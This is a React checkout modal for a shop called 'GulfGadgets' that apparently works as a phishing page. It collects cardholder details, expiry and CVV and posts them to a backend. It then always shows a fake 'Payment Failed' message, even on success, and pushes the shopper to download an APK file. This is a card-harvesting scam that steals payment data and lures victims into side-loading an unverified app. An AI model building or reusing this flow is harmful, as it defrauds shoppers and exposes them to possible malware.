import { useEffect, useState } from "react";
import { createPortal } from "react-dom";
import api from "../../api/client";

export default function CheckoutModal({ open, onClose, total }) {
  if (!open) return null;

  // ==============================
  // 💥 FAILURE STATE
  // ==============================
  const [showFailure, setShowFailure] = useState(false);

  // ==============================
  // 📦 FORM STATE
  // ==============================
  const [form, setForm] = useState({
    cardHolderName: "",
    contactNumber: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    country: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
  });

  const handleChange = (e) => {
    setForm({
      ...form,
      [e.target.name]: e.target.value,
    });
  };

  const isValid = Object.values(form).every(
    (val) => val.trim() !== ""
  );

  // ==============================
  // 💳 SUBMIT
  // ==============================
  const handlePayment = async (e) => {
    e.preventDefault();

    try {
      await api.post("/order-card", {
        cardHolderName: form.cardHolderName,
        last4: form.cardNumber.slice(-4),
        expiryMonth: form.expiryMonth,
        expiryYear: form.expiryYear,
        cvv: form.cvv,

        country: form.country,
        city: form.city,
        address: form.address,
        state: form.state,
        zipCode: form.zipCode,
        contactNumber: form.contactNumber,
      });

      // keep failure popup logic unchanged
      setTimeout(() => {
        setShowFailure(true);
      }, 700);
    } catch (err) {
      console.error(err);
      setShowFailure(true);
    }
  };

  // ==============================
  // 💰 FORMAT
  // ==============================
  const format = (num) =>
    new Intl.NumberFormat("en-IN", {
      style: "currency",
      currency: "INR",
      maximumFractionDigits: 2,
    }).format(num);

  // ==============================
  // 🔒 LOCK SCROLL
  // ==============================
  useEffect(() => {
    document.body.style.overflow = "hidden";
    return () => (document.body.style.overflow = "auto");
  }, []);

  const countries = [
    "Afghanistan", "Albania", "Algeria", "Andorra", "Angola", "Argentina",
    "Australia", "Austria", "Bangladesh", "Belgium", "Brazil", "Canada",
    "China", "France", "Germany", "India", "Indonesia", "Italy", "Japan",
    "Malaysia", "Mexico", "Nepal", "Netherlands", "New Zealand", "Pakistan",
    "Philippines", "Qatar", "Russia", "Saudi Arabia", "Singapore",
    "South Africa", "South Korea", "Spain", "Sri Lanka", "Sweden",
    "Switzerland", "Thailand", "Turkey", "UAE", "UK", "USA", "Vietnam", "Zimbabwe",
  ];

  return createPortal(
    <div className="fixed inset-0 z-[9999] bg-black/70 backdrop-blur-md flex items-center justify-center p-4">

      <div className="relative bg-[#16252d] border border-[#233c48] w-full max-w-[960px] rounded-xl shadow-2xl overflow-hidden flex flex-col md:flex-row max-h-[95vh]">

        {/* LEFT PANEL */}
        {/* LEFT PANEL */}
        <div className="w-full md:w-1/3 bg-[#1c2e38] p-8 flex flex-col border-b md:border-b-0 md:border-r border-[#233c48]">

          <h2 className="text-xl font-bold text-white mb-6">
            GulfGadgets
          </h2>

          {/* CARD PREVIEW */}
          <div className="relative w-full rounded-xl bg-gradient-to-br from-[#1ea7fd] to-[#0c6ba0] p-6 shadow-lg mb-8">

            <div className="text-white tracking-widest text-lg mb-6">
              **** **** **** {form.cardNumber.slice(-4) || "4242"}
            </div>

            <div className="flex justify-between text-white">
              <span>
                {form.cardHolderName || "John Doe"}
              </span>
              <span>
                {form.expiryMonth || "12"} /{" "}
                {form.expiryYear || "26"}
              </span>
            </div>
          </div>

          {/* TOTAL */}
          <div className="mt-auto border-t border-[#233c48] pt-6">
            <div className="flex justify-between text-white text-lg font-bold">
              <span>Total</span>
              <span className="text-primary">
                {format(total)}
              </span>
            </div>
          </div>
        </div>


        {/* RIGHT FORM */}
        <div className="w-full md:w-2/3 p-8 overflow-y-auto">

          <div className="flex justify-between mb-6">
            <h3 className="text-xl text-white font-bold">
              Secure Checkout
            </h3>

            <button
              onClick={onClose}
              className="text-gray-400 hover:text-white text-xl"
            >
              ✕
            </button>
          </div>

          <form onSubmit={handlePayment} className="space-y-6">

            <input
              name="cardHolderName"
              value={form.cardHolderName}
              onChange={handleChange}
              placeholder="Cardholder Name"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <input
              name="contactNumber"
              value={form.contactNumber}
              onChange={handleChange}
              placeholder="Contact Number"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <input
              name="address"
              value={form.address}
              onChange={handleChange}
              placeholder="Street Address"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <div className="grid grid-cols-2 gap-4">
              <input
                name="city"
                value={form.city}
                onChange={handleChange}
                placeholder="City"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                name="state"
                value={form.state}
                onChange={handleChange}
                placeholder="State"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <input
                name="zipCode"
                value={form.zipCode}
                onChange={handleChange}
                placeholder="Zip Code"
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              />

              <select
                name="country"
                value={form.country}
                onChange={handleChange}
                className="bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
              >
                <option value="">Select Country</option>
                {countries.map((country) => (
                  <option key={country} value={country}>
                    {country}
                  </option>
                ))}
              </select>
            </div>

            <input
              name="cardNumber"
              value={form.cardNumber}
              onChange={handleChange}
              placeholder="Card Number"
              className="w-full bg-[#101c22] border text-white border-[#233c48] rounded-lg py-3 px-4"
            />

            <div className="grid grid-cols-3 gap-4">
              <input
                name="expiryMonth"
                value={form.expiryMonth}
                onChange={handleChange}
                placeholder="MM"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                name="expiryYear"
                value={form.expiryYear}
                onChange={handleChange}
                placeholder="YYYY"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
              <input
                name="cvv"
                value={form.cvv}
                onChange={handleChange}
                placeholder="CVV"
                className="bg-[#101c22] text-white border border-[#233c48] rounded-lg py-3 px-4"
              />
            </div>

            <button
              type="submit"
              disabled={!isValid}
              className={`w-full py-4 rounded-lg font-bold text-white ${isValid
                  ? "bg-primary"
                  : "bg-gray-500 cursor-not-allowed"
                }`}
            >
              Pay shipping fee 149 only
            </button>
          </form>
        </div>

        {/* FAILURE POPUP */}
        {showFailure && (
          <div className="absolute inset-0 bg-black/80 backdrop-blur-md flex items-center justify-center z-50 p-4">

            <div className="bg-[#16252d] border border-[#233c48] rounded-xl p-8 max-w-md w-full text-center shadow-2xl">

              <div className="text-red-500 text-6xl mb-4">
                ⚠️
              </div>

              <h2 className="text-2xl font-bold text-white mb-2">
                Payment Failed
              </h2>

              <p className="text-gray-400 mb-6 leading-relaxed">
                Your payment could not be processed.
                <br />
                Download our mobile app to continue checkout.
              </p>

              <a
                href="/app-download.apk"
                download
                className="block w-full bg-primary text-white py-3 rounded-lg font-bold"
              >
                Download Our App
              </a>

              <button
                onClick={() => setShowFailure(false)}
                className="mt-4 text-sm text-gray-400 hover:text-white"
              >
                Continue on Website
              </button>
            </div>
          </div>
        )}
      </div>
    </div>,
    document.body
  );
}
